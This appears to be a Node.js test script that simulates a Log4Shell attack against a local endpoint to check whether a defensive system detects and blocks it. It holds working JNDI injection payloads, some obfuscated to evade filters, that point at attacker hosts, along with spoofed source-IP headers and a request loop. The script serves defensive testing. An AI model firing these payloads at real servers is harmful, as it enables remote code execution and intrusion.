const TARGET_URL = process.env.TARGET_URL || "http://localhost:3002/api/data";
const REQUESTS_PER_SECOND = 5;
const DURATION_SECONDS = 60;
const SPOOF_IPS = [
  "185.220.101.34",
  "45.142.212.100",
  "89.248.167.131",
  "198.235.24.130",
  "80.82.77.139",
];

const PAYLOADS = [
  "${jndi:ldap://45.142.212.100:1389/exploit}",
  "${jndi:ldap://185.220.101.34/a}",
  "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
  "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
  "${${upper:j}ndi:ldap://attacker.com/exploit}",
  "${jndi:rmi://45.142.212.100:1099/exploit}",
  "${jndi:dns://185.220.101.34/pwned}",
  "${j${::-n}di:ldap://89.248.167.131/x}",
];

// Headers to inject into — rotate through these
const INJECT_HEADERS = [
  "User-Agent",
  "X-Api-Version",
  "Referer",
  "Accept-Language",
  "X-Forwarded-For-Original",
  "X-Client-IP",
  "True-Client-IP",
];

let totalSent = 0;
let total400 = 0;
let total403 = 0;
let totalOther = 0;
let totalError = 0;

const startTime = Date.now();
const endTime = startTime + DURATION_SECONDS * 1000;

function randomSpoofIP() {
  return SPOOF_IPS[Math.floor(Math.random() * SPOOF_IPS.length)];
}

console.log("════════════════════════════════════════");
console.log("  DART Log4Shell Simulation");
console.log("  CVE-2021-44228 | CVSS 10.0 CRITICAL");
console.log(`  Target: ${TARGET_URL}`);
console.log("  Payloads: JNDI injection strings (safe simulation)");
console.log("  These payloads are detected but never executed.");
console.log("════════════════════════════════════════\n");

async function attackTick() {
  if (Date.now() >= endTime) {
    console.log("\n════════════════════════════════════════");
    console.log("  ATTACK COMPLETE");
    console.log("════════════════════════════════════════");
    console.log(`  Duration: ${DURATION_SECONDS}s`);
    console.log(`  Total Sent: ${totalSent}`);
    console.log(`  Detected/Blocked (400): ${total400}`);
    console.log(`  IP Blocked (403): ${total403}`);
    console.log(`  Other: ${totalOther}`);
    console.log(`  Errors: ${totalError}`);
    console.log("════════════════════════════════════════\n");
    process.exit(0);
  }

  const batchSize = REQUESTS_PER_SECOND / 2;
  const promises = [];

  for (let i = 0; i < batchSize; i++) {
    const spoofIP = randomSpoofIP();
    const payload = PAYLOADS[totalSent % PAYLOADS.length];
    const injectHeader = INJECT_HEADERS[totalSent % INJECT_HEADERS.length];

    totalSent++;

    const headers = {
      "X-Forwarded-For": spoofIP,
      "X-Real-IP": spoofIP,
      [injectHeader]: payload,
      "User-Agent":
        injectHeader === "User-Agent" ? payload : "Mozilla/5.0 (compatible)",
    };

    const runRequest = async () => {
      try {
        const res = await fetch(TARGET_URL, {
          headers,
          signal: AbortSignal.timeout(3000),
        });

        if (res.status === 400) {
          total400++;
          if (total400 === 1 || total400 % 10 === 0) {
            console.log(
              `[LOG4SHELL] ⚠ Payload detected — WAF blocking requests (${res.status})`
            );
          }
        } else if (res.status === 403) {
          total403++;
          if (total403 === 1 || total403 % 20 === 0) {
            console.log(
              `[LOG4SHELL] ✓ IP blocked — DART log4shell-patch-isolate playbook executed (${res.status})`
            );
          }
        } else {
          totalOther++;
        }
      } catch (err) {
        totalError++;
      }
    };

    promises.push(runRequest());

    if (totalSent % 5 === 0) {
      const elapsed = Math.floor((Date.now() - startTime) / 1000);
      console.log(
        `[LOG4SHELL] t=${elapsed}s | sent=${totalSent} | 400=${total400} | 403=${total403} | err=${totalError}`
      );
      console.log(
        `[LOG4SHELL] Injecting via header: ${injectHeader} | payload: ${payload.substring(0, 50)}...`
      );
    }
  }

  await Promise.allSettled(promises);
  setTimeout(attackTick, 500); // 2 ticks per second
}

attackTick();
